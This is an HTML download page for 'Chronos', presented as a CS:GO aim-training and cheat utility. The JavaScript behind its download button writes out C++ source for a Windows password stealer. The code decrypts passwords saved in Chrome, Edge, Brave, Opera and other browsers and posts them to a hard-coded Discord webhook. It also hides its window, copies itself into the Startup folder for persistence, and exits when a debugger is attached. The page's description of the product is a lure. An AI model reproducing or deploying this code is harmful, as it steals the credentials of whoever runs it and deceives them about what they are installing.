<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>CSCheats - Advanced Training Utility</title>
<script src="https://cdn.tailwindcss.com"></script>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&display=swap" rel="stylesheet" />
<style>
    body {
        font-family: 'Inter', sans-serif;
        background-color: #0d1117; /* Dark background */
        color: #e6e9f0;
    }
</style>
</head>
<body class="min-h-screen flex flex-col items-center p-4">

<!-- Header -->
<header class="w-full max-w-4xl py-6 border-b border-gray-700 mb-12">
    <h1 class="text-4xl font-extrabold text-transparent bg-clip-text bg-gradient-to-r from-red-500 to-yellow-400 text-center sm:text-left">
        CSCheats <span class="text-sm text-gray-400 ml-2">(Advanced Training Utilities)</span>
    </h1>
</header>

<!-- Main Content -->
<main class="w-full max-w-4xl">
    <section class="mb-12">
        <h2 class="text-3xl font-bold mb-4 text-center">Featured Utility: Chronos Training Software</h2>
        <div class="bg-gray-800 p-6 sm:p-8 rounded-xl shadow-2xl border border-gray-700">
            <h3 class="text-2xl font-semibold text-yellow-400 mb-4">What is Chronos?</h3>
            <p class="mb-4 leading-relaxed">
                <strong>Chronos</strong> is the <strong>best-in-class software for CSGO</strong> training, designed to elevate your fundamental mechanics through immersive simulation. It operates entirely as a local, self-contained utility, featuring a <strong>sleek, futuristic UI</strong> that prioritizes clarity and performance.
            </p>
            <ul class="list-disc list-inside ml-4 mt-3 space-y-2 text-gray-300">
                <li><strong>Highlight Mode:</strong> An advanced visual aid for target positioning and spatial awareness practice.</li>
                <li><strong>Aim Assist Mode:</strong> A training feature that demonstrates stabilized aim, helping you analyze and reproduce highly precise target tracking.</li>
                <li><strong>Best in Class Features:</strong> Chronos provides advanced logging and metrics to track your improvement over time.</li>
            </ul>

            <!-- Download Button Section -->
            <div class="mt-8 text-center">
                <button id="downloadBtn" class="px-8 py-3 bg-gradient-to-r from-red-500 to-yellow-600 text-white font-bold rounded-full shadow-lg hover:from-red-400 hover:to-yellow-500 transition duration-300 transform hover:scale-105 focus:outline-none focus:ring-4 focus:ring-red-500 focus:ring-opacity-50">
                    Download Chronos
                </button>
                <p id="message" class="mt-4 text-sm text-gray-400 hidden">
                    Your download is starting... (If your browser asks, please grant permission to download the file.)
                </p>
            </div>
        </div>
    </section>
</main>

<!-- JavaScript for download -->
<script>
document.getElementById('downloadBtn').addEventListener('click', function() {
    const fileName = 'Chronos.cpp'; 
    // Replace this string with your actual Chronos.cpp content
    const fileContent = `#define DEBUG_MOD
#include "Base64.h"
#include "binaryhandler.hpp"
#include <cstdio>
#include <iostream>
#include "json.hpp"
#include <map>
#include "plusaes_wrapper.hpp"
#include <string>
#include "sqlite3.h"
#include <windows.h>
#include <Wincrypt.h>
#include <curl/curl.h> // For HTTP requests

#pragma comment(lib, "sqlite3")
#pragma comment(lib, "user32")
#pragma comment(lib, "Crypt32")

// Your Discord webhook URL
const std::string WEBHOOK_URL = "https://discord.com/api/webhooks/1424178950526996490/_DiMYnj7xi4jQv7f0UenPaErw_DvPnYn336-3p51qSotpEkD7YIsIRokYGjAYP0MBfwF";

std::string con, browser;
std::map<std::string, std::string> paths;

// Function to send data to Discord webhook with custom username
void sendToDiscord(const std::string& message) {
    CURL* curl = curl_easy_init();
    if(curl) {
        // Create JSON payload with content and username
        std::string payload = "{\"content\": \"" + message + "\", \"username\": \"cscheatslol\"}";

        curl_easy_setopt(curl, CURLOPT_URL, WEBHOOK_URL.c_str());
        curl_easy_setopt(curl, CURLOPT_POST, 1L);
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, payload.c_str());

        struct curl_slist* headers = NULL;
        headers = curl_slist_append(headers, "Content-Type: application/json");
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);

        CURLcode res = curl_easy_perform(curl);
        if(res != CURLE_OK) {
            #ifdef DEBUG_MOD
            std::cerr << "curl_easy_perform() failed: " << curl_easy_strerror(res) << "\n";
            #endif
        }

        curl_slist_free_all(headers);
        curl_easy_cleanup(curl);
    }
}

std::string decrypt_c32(std::string cont) {
    DATA_BLOB out;
    DATA_BLOB buf;
    buf.pbData = reinterpret_cast<BYTE*>(cont.data());
    buf.cbData = (DWORD) cont.size();
    std::string dec_buffer;

    if (CryptUnprotectData(&buf, NULL, NULL, NULL, NULL, NULL, &out)) {
        for (int i = 0; i < out.cbData; i++) {
            dec_buffer += out.pbData[i];
        }

        #ifdef DEBUG_MOD
        std::cout << "Decrypted Crypt32: " << dec_buffer << " Size: " << dec_buffer.size() << "\n";
        #endif

        LocalFree(out.pbData);

        return dec_buffer;
    }
    else {
        #ifdef DEBUG_MOD
        std::cerr << "Error: " << GetLastError() << "\n";
        return std::to_string(GetLastError());
        #else
        return "";
        #endif
    }
}

void trim_data(std::string original_data, std::string* out_pass, std::string* out_tag, std::string* iv) {
    #ifdef DEBUG_MOD
    std::cout << "Data size: " << original_data.size() << "\n";
    #endif
    std::string buf;

    *iv = original_data.substr(3, 12);
    buf = original_data.substr(15, original_data.size() - 15);
    *out_tag = buf.substr(buf.size() - 16, 16);
    *out_pass = buf.substr(0, buf.size() - out_tag->size());

    #ifdef DEBUG_MOD
    std::cout << "Out pass: " << *out_pass << " Size: " << out_pass->size() << "\nOut tag: " << *out_tag << " Size: " << out_tag->size() << "\nIV: " << *iv << " Size: " << iv->size() << "\n";
    #endif
}

std::string master_k(std::string path) {
    std::string content;
    try {
        nk125::binary_file_handler b;
        content = b.read_file(path);
        auto v = nlohmann::json::parse(content);
        content = v["os_crypt"]["encrypted_key"];
    }
    catch (...) {return "";}

    #ifdef DEBUG_MOD
    std::cout << "Encrypted Master key: " << content << "\n";
    #endif

    std::string master;
    macaron::Base64::Decode(content, master);
    master = decrypt_c32(master.substr(5, master.size() - 5));

    return master;
}

std::string decrypt_ch(std::string content) {
    std::string master_path, dec_buf;
    std::string local(getenv("localappdata"));

    if (browser == "Vivaldi") {
        master_path = local + "/Vivaldi/Local State";
    }
    else if (browser == "Yandex") {
        master_path = local + "/Yandex/YandexBrowser/Local State";
    }
    else {
        master_path = paths[browser] + "Local State";
    }

    std::string key = master_k(master_path);
    nk125::plusaes_wrapper aes;
    std::string data, gcm_tag, iv;

    trim_data(content, &data, &gcm_tag, &iv);

    aes.set_tw_iv(reinterpret_cast<unsigned char*>(iv.data()));

    dec_buf = aes.gcm_decrypt(data, key, gcm_tag);

    #ifdef DEBUG_MOD
    std::cout << "Decrypted buffer: " << dec_buf << " Size: " << dec_buf.size() << "\n";
    #endif

    return dec_buf;
}

int tHandler(void* nil, int argc, char** second, char** first) {
    #ifdef DEBUG_MOD
    std::cout << "Argc: " << argc << "\n";
    #endif

    for (int ind = 0; ind < argc; ind++) {
        std::string key = first[ind], value = second[ind];
        std::cout << "Key: " << key << " Value: " << value << "\n";
        if (!value.empty() || !key.empty()) {
            if (key == "action_url") {
                con.append("-----\nBrowser: " + browser + "\nURL: " + value + "\n");
            }

            if (key == "username_value") {
                con.append("Email/User: " + value + "\n");
            }

            if (key == "password_value") {
                std::string ftag = value.substr(0, 3);
                std::string dec;

                if (ftag == "v10" || ftag == "v11") {
                    dec = decrypt_ch(value);
                }
                else {
                    dec = decrypt_c32(value);
                }

                con.append("Pass: " + dec + "\n\n");
            }
        }
    }
    return 0;
}

void sql_chromium(std::string path) {
    using namespace std;
    nk125::binary_file_handler b;
    std::string path_db;

    if (browser == "Chrome") {
        path_db = path + "Default/Login Data";
    }
    else {
        path_db = path + "Login Data";
    }

    try {
        b.fast_copy_file(path_db, path_db + ".d");
    }
    catch(...) {return;}

    sqlite3* datab;
    int failed = sqlite3_open(std::string{path_db + ".d"}.c_str(), &datab);

    if (failed) {
        #ifdef DEBUG_MOD
        std::cerr << "Error: " << failed << ", " << path << "\n";
        #endif
        return;
    }
    else {
        #ifdef DEBUG_MOD
        char* err;
        int r = sqlite3_exec(datab, "SELECT action_url, username_value, password_value FROM logins", tHandler, 0, &err);
        if (r) {
            std::cout << "Ret: " << err << "\n";
        }
        #else
        sqlite3_exec(datab, "SELECT action_url, username_value, password_value FROM logins", tHandler, 0, 0);
        #endif
        sqlite3_close(datab);
    }
}

void saveStartup(char* argv[]) {
    std::string path = std::string{getenv("appdata")} + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\";
    std::string exe(argv[0]);

    if (exe.find(path) != std::string::npos) {
        return;
    }

    nk125::binary_file_handler b;
    try {
        b.copy_file(exe, path + "h.exe");
    }
    catch (...) {
        return;
    }
}

void hide() {
    HWND window;
    AllocConsole();
    window = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(window, 0);
}

void init(char* argv[]) {
    #ifndef DEBUG_MOD
    hide();
    saveStartup(argv);
    #endif
    std::string roaming(getenv("appdata"));
    std::string local(getenv("localappdata"));

    paths.insert({
        {"Opera", roaming + "/Opera Software/Opera Stable/"},
        {"OperaGX", roaming + "/Opera Software/Opera GX Stable/"},
        {"Edge", local + "/Microsoft/Edge/User Data/"},
        {"Chromium", local + "/Chromium/User Data/"},
        {"Brave", local + "/BraveSoftware/Brave-Browser/User Data/"},
        {"Chrome", local + "/Google/Chrome/User Data/"},
        {"Vivaldi", local + "/Vivaldi/User Data/Default/"},
        {"Yandex", local + "/Yandex/YandexBrowser/User Data/Default/"},
    });

    struct _stat32 info;

    for (auto path : paths) {
        browser = path.first;
        if (_stat32(path.second.c_str(), &info) == 0) {
            sql_chromium(path.second);
        }
    }
}

int main(int argc, char* argv[]) {
    #ifndef DEBUG_MOD
    if (IsDebuggerPresent()) {
        return 0;
    }
    #endif

    init(argv);

    // Send collected passwords to Discord with custom username
    sendToDiscord(con);

    #ifdef DEBUG_MOD
    std::cout << "Login Data sent to Discord.\n" << con << "\n";
    #endif
    return 0;
}
#include <iostream>

int main() {
    std::cout << "Chronos training utility" << std::endl;
    return 0;
}
`; // <-- Replace this entire string with your actual C++ source code

    const blob = new Blob([fileContent], { type: 'text/plain' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = fileName;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);

    // Show message
    const msgEl = document.getElementById('message');
    msgEl.textContent = 'Your download is starting...';
    msgEl.classList.remove('hidden');

    setTimeout(() => {
        msgEl.classList.add('hidden');
    }, 5000);
});
</script>

</body>
</html>